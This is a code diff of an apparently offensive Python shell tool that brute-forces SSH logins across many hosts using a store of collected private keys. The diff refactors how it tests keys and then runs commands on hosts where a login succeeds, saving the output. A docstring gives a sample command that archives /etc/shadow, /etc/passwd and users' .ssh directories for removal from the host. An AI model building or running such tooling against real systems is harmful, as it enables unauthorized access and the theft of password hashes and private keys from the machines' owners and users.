@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 import argparse
-from scapy.all import sr, IP, TCP, conf as scapy_conf, L3RawSocket
 import io
 import sys
 import cmd2
@@ -13,15 +12,17 @@ import sqlite3
 import ipaddress
 import struct
 import socket
-from glob import glob
 import hashlib
 import base64
 import asyncio
 import asyncssh
+from itertools import groupby
+from glob import glob
+from scapy.all import sr, IP, TCP, conf as scapy_conf, L3RawSocket
 from tabulate import tabulate
-from collections import OrderedDict
+from collections import OrderedDict, namedtuple
 from sqlalchemy.orm import sessionmaker, scoped_session, Query
-from sqlalchemy.sql import func, select, case
+from sqlalchemy.sql import func, select, case, functions
 from sqlalchemy import create_engine
 from sshame.db import Host, Base, Key, Credential, Command, CommandiAlias
 
@@ -427,16 +428,17 @@ class Shell(cmd2.Cmd):
 
         return OrderedDict((x.fingerprint, x.private_key) for x in q)
 
-    def get_valid_credentials(self, host=None, port=None, usernames=None):
+    def get_command_targets(self, host=None, port=None, usernames=None):
         """Returns keys that can logon to username@host:port"""
 
-        q = (self.db.query(Key.fingerprint, Key.private_key, Credential.host_address,
-             Credential.host_port, Credential.username)
-             .distinct()
+        q = (self.db.query(Key.private_key.label("private_key"),
+                 Credential.host_address.label("host_address"),
+                 Credential.host_port.label("host_port"),
+                 Credential.username.label("username"))
              .outerjoin(Credential, Key.fingerprint == Credential.key_fingerprint)
              .filter(Credential.valid == True)
-             #.group_by(Key.fingerprint, Credential.host_address,
-             #Credential.host_port, Credential.username)
+             .order_by(Credential.host_address,
+             Credential.host_port, Credential.username)
              )
         if host:
             q.filter(Credential.host_address == host)
@@ -445,7 +447,14 @@ class Shell(cmd2.Cmd):
         if usernames:
             q.filter(Credential.username.in_(usernames))
 
-        return q
+        Target = namedtuple("Target", ["username", "host_address", "host_port", "keys"])
+
+        ret = []
+        for key, group in groupby(q, lambda x: (x.username, x.host_address, x.host_port)):
+            t = Target(*key, keys=[x[0] for x in group])
+            ret.append(t)
+
+        return ret
 
     def get_valued_keys(self):
         return (self.db.query(Key.fingerprint.label('fingerprint'),
@@ -526,7 +535,7 @@ class Shell(cmd2.Cmd):
             log.debug(f'[{self.log_id}] [D] key3 {self.key_fingerprint} for {self.username}@{self.host_address}')
             return ret
 
-    async def exploit_single_target(self, host_address, host_port, username='root', keys=None, cmds=None):
+    async def test_keys_on_single_target(self, host_address, host_port, username='root', keys=None, cmds=None):
         log_id = f"{username}@{host_address}:{host_port}"
         async with self.sem:
             _pkssh = self.PublicKeySSHClient(
@@ -535,7 +544,6 @@ class Shell(cmd2.Cmd):
             def client_factory():
                 return _pkssh
 
-            cmd_exec = False
             valid_creds = 0
             keys_consumed = 0
             log.debug(f'[*] [{log_id}] Remaining keys: {len(keys)}')
@@ -547,42 +555,6 @@ class Shell(cmd2.Cmd):
                                                                                      client_keys=None, x509_trusted_certs=None, client_host_keys=None), timeout=self.timeout)
                     log.debug(f'[*] [{log_id}] Connection created')
                     valid_creds += 1
-                    if not cmds:
-                        continue
-                    # cmd = 'ls .ssh/'
-                    cmd_exec = True
-                    async with conn:
-                        for cmd in cmds:
-                            log.debug(f'[{log_id}] executing cmd: {cmd}')
-                            cmd_alias = self.db.query(CommandiAlias.cmd).filter(
-                                CommandiAlias.alias == cmd).scalar()
-                            c = self.db.query(Command).filter(Command.host_address == host_address).filter(Command.host_port == host_port).filter(
-                                Command.cmd == cmd).filter(Command.username == username).first()
-                            if not c:
-                                c = Command(
-                                    host_address=host_address, host_port=host_port, cmd=cmd, username=username)
-                            try:
-                                res = await conn.run(cmd_alias if cmd_alias else cmd, check=False)
-                                # log.debug('done')
-                                so = res.stdout
-                                se = res.stderr
-                                es = res.exit_status
-                                c.exit_status = es
-                                # log.debug(f'[{host_address}:{host_port}]
-                                # exit: {es}')
-                                if es != 0:
-                                    c.stderr = se
-                                    log.info(f'[{log_id}] [{es}] "{se}"')
-                                else:
-                                    c.stdout = so
-                                    log.debug(f'[{log_id}] [{es}] "{so}"')
-                            except Exception as ex:
-                                msg = str(ex)
-                                log.warning(f'[{log_id}] "{cmd}" {msg}')
-                                c.exception = msg
-                            self.db.add(c)
-                        self.db.commit()
-                        return -2
                 except asyncio.TimeoutError:
                     log.warning(f'[{log_id}] Time out')
                     return valid_creds
@@ -597,14 +569,68 @@ class Shell(cmd2.Cmd):
                     if not any(x in msg for x in ignore):
                         log.warning(f'[{log_id}] {msg}')
                         return valid_creds
-                    if not _pkssh.key_fingerprint or cmd_exec:
+                    if not _pkssh.key_fingerprint:
                         log.debug(f'[{log_id}] No more keys')
                         return valid_creds  # Exception("No more keys")
                 finally:
                     if conn:
                         conn.abort()
 
-    async def schedule_exploit_jobs(self, usernames, cmds=None):
+    async def run_command_on_single_target(self, host_address, host_port, username='root', keys=None, cmds=None):
+        log_id = f"{username}@{host_address}:{host_port}"
+        async with self.sem:
+            cmds_run = 0
+            conn = None
+            try:
+                log.debug(f'[*] [{log_id}] Connecting')
+                conn = await asyncio.wait_for(asyncssh.connect(host_address, port=host_port, username=username, known_hosts=None,
+                             client_keys=keys, x509_trusted_certs=None, client_host_keys=None), timeout=self.timeout)
+                log.debug(f'[*] [{log_id}] Connection created')
+                async with conn:
+                    for cmd in cmds:
+                        log.debug(f'[{log_id}] executing cmd: {cmd}')
+                        cmd_alias = self.db.query(CommandiAlias.cmd).filter(
+                            CommandiAlias.alias == cmd).scalar()
+                        c = self.db.query(Command).filter(Command.host_address == host_address).filter(Command.host_port == host_port).filter(
+                            Command.cmd == cmd).filter(Command.username == username).first()
+                        if not c:
+                            c = Command(
+                                host_address=host_address, host_port=host_port, cmd=cmd, username=username)
+                        try:
+                            res = await conn.run(cmd_alias if cmd_alias else cmd, check=False)
+                            cmds_run += 1
+                            # log.debug('done')
+                            so = res.stdout
+                            se = res.stderr
+                            es = res.exit_status
+                            c.exit_status = es
+                            # log.debug(f'[{host_address}:{host_port}]
+                            # exit: {es}')
+                            if es != 0:
+                                c.stderr = se
+                                log.info(f'[{log_id}] [{es}] "{se}"')
+                            else:
+                                c.stdout = so
+                                log.debug(f'[{log_id}] [{es}] "{so}"')
+                        except Exception as ex:
+                            msg = str(ex)
+                            log.warning(f'[{log_id}] "{cmd}" {msg}')
+                            c.exception = msg
+                        self.db.add(c)
+                        self.db.commit()
+                    return cmds_run
+            except asyncio.TimeoutError:
+                log.warning(f'[{log_id}] Time out')
+                return cmds_run
+            except Exception as ex:
+                msg = str(ex)
+                log.warning(f'[{log_id}] {msg}')
+                return cmds_run
+            finally:
+                if conn:
+                    conn.abort()
+
+    async def schedule_jobs(self, usernames, cmds=None):
 
         keys = {x.fingerprint: x.private_key for x in self.db.query(Key)}
 
@@ -614,11 +640,11 @@ class Shell(cmd2.Cmd):
         hosts_cnt = self.db.query(Host.address, Host.port).count()
         i = 0
         if cmds:
-            keys = self.get_valid_credentials()
-            for x in keys:
-                jobs.append(self.exploit_single_target(username=x.username,
+            targets = self.get_command_targets()
+            for x in targets:
+                jobs.append(self.run_command_on_single_target(username=x.username,
                     host_address=x.host_address, host_port=x.host_port,
-                    keys={x.fingerprint: x.private_key}, cmds=cmds))
+                    keys=x.keys, cmds=cmds))
         else:
             for (host, port) in self.db.query(
                     Host.address, Host.port).filter(Host.enabled == True):
@@ -626,7 +652,7 @@ class Shell(cmd2.Cmd):
                     keys = self.get_keys_to_test(host, port, username)
                     if not keys:
                         continue
-                    jobs.append(self.exploit_single_target(host, port,
+                    jobs.append(self.test_keys_on_single_target(host, port,
                        username, keys, cmds))
                 i += 1
                 progbar(i, hosts_cnt)
@@ -674,7 +700,7 @@ class Shell(cmd2.Cmd):
         '''Brute force targets using available keys
 E.g. exploit -c "tar -cf - .ssh /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode file.tar.gz"'''
         asyncio.get_event_loop().run_until_complete(
-            self.schedule_exploit_jobs(arg.user, arg.command))
+            self.schedule_jobs(arg.user, arg.command))
 
     commands_parser = cmd2.Cmd2ArgumentParser()
     commands_item_group = commands_parser.add_mutually_exclusive_group()
